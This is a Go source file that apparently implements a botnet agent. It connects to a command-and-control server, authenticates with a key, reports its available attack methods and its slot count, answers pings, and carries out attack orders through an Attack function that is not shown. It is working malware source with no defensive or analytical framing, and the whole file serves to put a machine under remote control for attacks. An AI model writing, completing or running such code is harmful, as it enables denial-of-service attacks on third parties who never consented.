package main

import (
	"api/core/models/log"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"time"
)

var (
	CurrentID = 0
	//Methodslog    = log.New(os.Stderr, "[methods] ", 0)
	methods map[string]interface{}
	conn    net.Conn
)

const (
	MessageAuthenticate = iota
	MessageSuccess      = iota
	MessageFailure      = iota
	MessageAttack       = iota
	MessagePing         = iota
	MessageStop         = iota
	MessageMethods      = 100
)

func main() {
	Load()
	LoadMethods()
connect:
	if err := connect(); err != nil {
		log.Println("failed to connect retrying in 5 seconds! \"" + err.Error() + "\"")
		time.Sleep(5 * time.Second)
		goto connect
	}
	if _, err := conn.Write([]byte(Config.Key)); err != nil {
		log.Println(err)
		goto connect
	}
	_, bytes := NewMessage(0, fmt.Sprintf("%s|%s|%s", Config.Name, Config.Slots, Config.Type))
	conn.Write(bytes)
	log.Println("succesfully connected to C&C")
	for {
		msg, err := ReadMessage(conn)
		if err != nil || msg == nil {
			if err == io.EOF {
				goto connect
			}
			continue
		}
		switch msg.ID {
		case 1:
			log.Println("successfully authenticated!")
			var methodNames []string
			for methodName := range methods {
				methodNames = append(methodNames, methodName)
			}

			jsonData, err := json.Marshal(methodNames)
			if err != nil {
				fmt.Println("Error encoding to JSON:", err)
				return
			}

			// Send Methods message
			_, encodedMethods := NewMessage(105, string(jsonData))
			conn.Write(encodedMethods)

			// Wait for server's response and update CurrentID
			msg, err := ReadMessage(conn)
			if err != nil {
				log.Println("Error receiving server response:", err)
				continue
			}

			// Assuming the response message contains the updated CurrentID
			if msg.ID == MessageSuccess {
				log.Printf("Server synced, new CurrentID: %s", string(msg.Content))

			}
		case 3:
			log.Println("attack inbound! reading data!")
			info, err := ReadAttack(conn)
			if err != nil {
				log.Println("failed to parse attack data!")
				continue
			}
			Attack(info)
		case 4:
			log.Println("ping!")
			_, bytes = NewMessage(4, "pong!")
			conn.Write(bytes)
		case 5:
			log.Println("Methods sent to the server")
		}
	}
}

func connect() error {
	CurrentID = 0
	connnection, err := net.Dial("tcp", Config.Master)
	if err != nil {
		return err
	}
	conn = connnection
	return nil
}
